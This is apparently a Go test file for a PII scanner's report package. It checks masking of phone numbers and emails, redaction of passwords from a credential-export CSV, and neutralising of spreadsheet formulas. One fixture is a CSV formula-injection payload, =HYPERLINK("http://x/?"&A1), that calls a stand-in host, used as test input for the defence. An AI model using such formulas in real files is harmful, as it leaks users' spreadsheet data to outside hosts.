package report

import (
	"bytes"
	"encoding/csv"
	"strings"
	"testing"

	"github.com/rdataback/privacylens/internal/detect"
	"github.com/rdataback/privacylens/internal/scanner"
)

// Two findings on the same line must hide each other's value: masked alone,
// each context shows the sibling's number in full.
func TestMaskFindingsHidesSiblingMatches(t *testing.T) {
	line := "PHONE 412-823-0629  FAX 412-823-8314"
	fs := []scanner.Finding{
		{Path: `C:\a.docx`, Category: "Phone Number", Match: "412-823-0629", Context: line},
		{Path: `C:\a.docx`, Category: "Phone Number", Match: "412-823-8314", Context: line},
	}
	masked := MaskFindings(fs)
	for _, f := range masked {
		if strings.Contains(f.Context, "412-823") {
			t.Errorf("sibling value leaked in context %q", f.Context)
		}
	}
	if masked[0].Context != "PHONE ***-***-0629  FAX ***-***-8314" {
		t.Errorf("context = %q", masked[0].Context)
	}
	if masked[0].Match != "***-***-0629" || masked[1].Match != "***-***-8314" {
		t.Errorf("matches = %q, %q", masked[0].Match, masked[1].Match)
	}
}

// Sibling masking is per file: the same value in another file's context is
// that file's own business.
func TestMaskFindingsScopedToPath(t *testing.T) {
	fs := []scanner.Finding{
		{Path: `C:\a.txt`, Match: "412-823-0629", Context: "call 412-823-0629 or 412-823-8314"},
		{Path: `C:\b.txt`, Match: "412-823-8314", Context: "fax 412-823-8314"},
	}
	masked := MaskFindings(fs)
	if !strings.Contains(masked[0].Context, "412-823-8314") {
		t.Errorf("a.txt context should keep b.txt's value (no finding of its own there): %q", masked[0].Context)
	}
}

// Redact secrets — the password column of a credential-export CSV — must
// vanish completely: no verify tail, no length.
func TestMaskFindingsRedactsSecrets(t *testing.T) {
	fs := []scanner.Finding{{
		Path:     `C:\Users\ann\Chrome Passwords.csv`,
		Category: "Email Address",
		Match:    "ann@nvtsa.com",
		Context:  "www.macys.com,https://www.macys.com/account/signin,ann@nvtsa.com,Jmmyann822",
		Redact:   []string{"Jmmyann822"},
	}}
	masked := MaskFindings(fs)
	got := masked[0]
	if strings.Contains(got.Context, "Jmmyann822") || strings.Contains(got.Context, "n822") {
		t.Errorf("password leaked in context %q", got.Context)
	}
	want := "www.macys.com,https://www.macys.com/account/signin,a**@nvtsa.com," + redacted
	if got.Context != want {
		t.Errorf("context = %q, want %q", got.Context, want)
	}
	if got.Redact != nil {
		t.Error("masked finding still carries Redact secrets")
	}
}

// A secret shared by siblings on the same line is hidden in every finding's
// context, not just the finding that carried it.
func TestMaskFindingsRedactsSecretsAcrossSiblings(t *testing.T) {
	line := "site.com,https://site.com,ann@nvtsa.com,Jmmyann822"
	fs := []scanner.Finding{
		{Path: `C:\p.csv`, Match: "ann@nvtsa.com", Context: line, Redact: []string{"Jmmyann822"}},
		{Path: `C:\p.csv`, Match: "site.com", Context: line},
	}
	for _, f := range MaskFindings(fs) {
		if strings.Contains(f.Context, "Jmmyann822") {
			t.Errorf("password leaked in sibling context %q", f.Context)
		}
	}
}

// MaskFinding (single) keeps its old contract and applies Redact.
func TestMaskFindingSingle(t *testing.T) {
	f := MaskFinding(scanner.Finding{
		Match:   "j.smith@comcast.net",
		Context: "login j.smith@comcast.net pw hunter22",
		Subject: "re: j.smith@comcast.net",
		Redact:  []string{"hunter22"},
	})
	if f.Match != "j******@comcast.net" {
		t.Errorf("match = %q", f.Match)
	}
	if f.Context != "login j******@comcast.net pw "+redacted {
		t.Errorf("context = %q", f.Context)
	}
	if f.Subject != "re: j******@comcast.net" {
		t.Errorf("subject = %q", f.Subject)
	}
}

// Document markings are indicators, not secrets: the match stays plain in
// masked output while ordinary PII on the same line is still masked.
func TestMaskFindingsLeavesMarkingsPlain(t *testing.T) {
	line := "CUI//SP-PRIV — contact j.smith@comcast.net"
	fs := []scanner.Finding{
		{Path: `C:\doc.txt`, Category: detect.CategoryCMMC, Match: "CUI//SP-PRIV", Context: line},
		{Path: `C:\doc.txt`, Category: "Email Address", Match: "j.smith@comcast.net", Context: line},
	}
	masked := MaskFindings(fs)
	if masked[0].Match != "CUI//SP-PRIV" {
		t.Errorf("marking match was masked: %q", masked[0].Match)
	}
	want := "CUI//SP-PRIV — contact j******@comcast.net"
	for _, f := range masked {
		if f.Context != want {
			t.Errorf("context = %q, want %q", f.Context, want)
		}
	}
}

// FileGroups: one entry per document, order preserved, all findings inside.
func TestFileGroups(t *testing.T) {
	r := &Report{Findings: []scanner.Finding{
		{Path: `C:\a.pdf`, Category: "SSN"},
		{Path: `C:\a.pdf`, Category: "Phone Number"},
		{Path: `C:\a.pdf`, Category: "Phone Number"},
		{Path: `C:\b.txt`, Category: "Email Address"},
	}}
	groups := r.FileGroups()
	if len(groups) != 2 || groups[0].Path != `C:\a.pdf` || groups[1].Path != `C:\b.txt` {
		t.Fatalf("groups = %+v", groups)
	}
	if len(groups[0].Findings) != 3 || len(groups[1].Findings) != 1 {
		t.Errorf("finding counts wrong: %d, %d", len(groups[0].Findings), len(groups[1].Findings))
	}
	cc := groups[0].CategoryCounts()
	if len(cc) != 2 || cc[0].Category != "Phone Number" || cc[0].Count != 2 || cc[1].Category != "SSN" {
		t.Errorf("category counts = %+v", cc)
	}
}

// CSV cells that a spreadsheet would execute as formulas are neutralized.
func TestWriteCSVNeutralizesFormulas(t *testing.T) {
	r := &Report{Masked: false, Findings: []scanner.Finding{
		{Path: "/d/a.txt", FileName: "a.txt", Category: "Phone Number", Confidence: "medium", Line: 1,
			Match: "+1 412-823-0629", Context: `=HYPERLINK("http://x/?"&A1) call +1 412-823-0629`},
		{Path: "/d/b.txt", FileName: "b.txt", Category: "SSN", Confidence: "high", Line: 2,
			Match: "219-09-9999", Context: "SSN 219-09-9999"},
	}}
	var buf bytes.Buffer
	if err := WriteCSV(&buf, r); err != nil {
		t.Fatal(err)
	}
	rows, err := csv.NewReader(&buf).ReadAll()
	if err != nil {
		t.Fatal(err)
	}
	if got := rows[1][5]; got != "'+1 412-823-0629" {
		t.Errorf("match cell = %q, want apostrophe-prefixed", got)
	}
	if got := rows[1][6]; !strings.HasPrefix(got, "'=HYPERLINK") {
		t.Errorf("context cell = %q, want apostrophe-prefixed", got)
	}
	if got := rows[2][5]; got != "219-09-9999" {
		t.Errorf("ordinary match cell = %q, want unchanged", got)
	}
}

// The sender of a mail finding is masked like any other address, keeping
// the display name people recognize.
func TestMaskFrom(t *testing.T) {
	cases := map[string]string{
		"Jane Doe <jane.doe@example.com>": "Jane Doe <j*******@example.com>",
		"jane.doe@example.com":            "j*******@example.com",
		"Payroll Team":                    "Payroll Team",
		"":                                "",
	}
	for in, want := range cases {
		if got := maskFrom(in); got != want {
			t.Errorf("maskFrom(%q) = %q, want %q", in, got, want)
		}
	}
	f := MaskFindings([]scanner.Finding{{Path: "a.pst", Category: "SSN", Match: "219-09-9999", From: "Jane <jane@example.com>"}})[0]
	if f.From != "Jane <j***@example.com>" {
		t.Errorf("masked finding From = %q", f.From)
	}
}
